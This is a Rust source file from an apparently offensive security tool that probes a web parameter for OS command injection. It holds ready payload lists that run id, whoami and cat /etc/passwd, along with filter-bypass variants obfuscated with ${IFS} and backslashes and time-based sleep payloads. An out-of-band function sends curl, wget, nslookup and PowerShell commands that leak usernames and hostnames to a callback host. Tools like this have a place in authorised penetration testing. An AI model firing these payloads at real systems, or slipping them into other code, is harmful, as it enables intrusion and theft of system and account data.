use colored::Colorize;
use reqwest::Client;
use std::time::{Duration, Instant};

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(
            reqwest::header::HeaderMap::from_iter([(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
            )]),
        );
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const OS_PAYLOADS: &[&str] = &[
    ";id", "|id", "`id`", "$(id)", ";whoami", "|whoami",
    "&whoami", "&&whoami", "||whoami", ";uname -a",
    "|uname -a", "$(uname -a)", ";cat /etc/passwd",
    "|cat /etc/passwd", "$(cat /etc/passwd)",
];

const OS_MARKERS: &[&str] = &[
    "uid=", "gid=", "groups=", "root:x:0:0", "nobody:", "/bin/",
    "Linux", "Darwin", "COMMAND.COM", "Microsoft Windows",
    "Volume in drive", "Directory of", "\\Windows\\System32",
];

const FILTER_BYPASS: &[&str] = &[
    ";i\\d", "|i\\d", "`i\\d`", "$(i\\d)",
    ";w\\hoami", "|w\\hoami", ";${IFS}id", "|${IFS}id",
    ";$IFS$id", ";id$IFS", "$(cat${IFS}/etc/passwd)",
    ";cat</etc/passwd", ";/bin/c\\at${IFS}/etc/passwd",
    ";c\\at${IFS}/etc\\/passwd", ";'cat'${IFS}/etc/passwd",
    ";\"cat\"${IFS}/etc/passwd", ";c${sh}at${IFS}/etc/passwd",
];

pub async fn os_inject(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} OS Command Injection Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut found = false;

    for payload in OS_PAYLOADS {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                for marker in OS_MARKERS {
                    if body.contains(marker) {
                        println!("{} [CRITICAL] Command injection confirmed!", "[!]".red().bold());
                        println!("  {} Payload: {}", "•".cyan(), payload);
                        println!("  {} Marker:  {}", "•".cyan(), marker);
                        found = true;
                        break;
                    }
                }
            }
            Err(_) => {}
        }
        if found { break; }
    }

    if !found {
        println!("{} No direct command injection detected.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn filter_bypass(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Command Injection Filter Bypass", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut found = false;

    for payload in FILTER_BYPASS {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                for marker in OS_MARKERS {
                    if body.contains(marker) {
                        println!("{} [CRITICAL] Filter bypass successful!", "[!]".red().bold());
                        println!("  {} Payload: {}", "•".cyan(), payload);
                        println!("  {} Marker:  {}", "•".cyan(), marker);
                        found = true;
                        break;
                    }
                }
            }
            Err(_) => {}
        }
        if found { break; }
    }

    if !found {
        println!("{} No filter bypass payloads succeeded.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn time_based(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Time-Based Command Injection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout + 10, token);

    let baseline_start = Instant::now();
    let baseline_url = format!("{}{}{}=1", url, if url.contains('?') { "&" } else { "?" }, param);
    let _ = client.get(&baseline_url).send().await?;
    let baseline = baseline_start.elapsed();

    println!("{} Baseline: {:.2}s", "[*]".cyan().bold(), baseline.as_secs_f64());

    let payloads = [
        ("Unix sleep", ";sleep 5"),
        ("Unix sleep (pipe)", "|sleep 5"),
        ("Unix sleep (and)", "&&sleep 5"),
        ("Windows timeout", "&timeout 5"),
        ("Windows ping", "&ping -n 5 127.0.0.1"),
        ("PowerShell", ";powershell -c Start-Sleep 5"),
    ];

    let mut found = false;
    for (name, payload) in &payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        let start = Instant::now();
        let _ = client.get(&test_url).send().await;
        let elapsed = start.elapsed();

        let delayed = elapsed.as_secs_f64() > baseline.as_secs_f64() + 4.0;
        let status = if delayed { "DELAYED".red().bold() } else { "normal".green() };
        println!("  {} {:20} {:>7.2}s  {}", "•".cyan(), name, elapsed.as_secs_f64(), status);

        if delayed {
            found = true;
            println!("{} [HIGH] Time-based command injection via {}!", "[!]".red().bold(), name);
        }
    }

    if !found {
        println!("\n{} No time-based command injection detected.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn oob(
    url: &str,
    param: &str,
    callback_host: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} OOB Command Injection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:       {}", "[*]".cyan().bold(), url);
    println!("{} Param:     {}", "[*]".cyan().bold(), param);
    println!("{} Callback:  {}", "[*]".cyan().bold(), callback_host);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        format!(";curl http://{}/$(whoami)", callback_host),
        format!(";wget http://{}/$(id)", callback_host),
        format!("|nslookup $(whoami).{}", callback_host),
        format!(";ping -c 1 $(hostname).{}", callback_host),
        format!("&powershell -c \"iwr http://{}/$env:USERNAME\"", callback_host),
    ];

    for payload in &payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        let _ = client.get(&test_url).send().await;
        println!("  {} Sent: {}", "•".cyan(), payload);
    }

    println!("\n{} Payloads sent. Monitor callback server for DNS/HTTP hits.", "[*]".cyan().bold());
    Ok(())
}
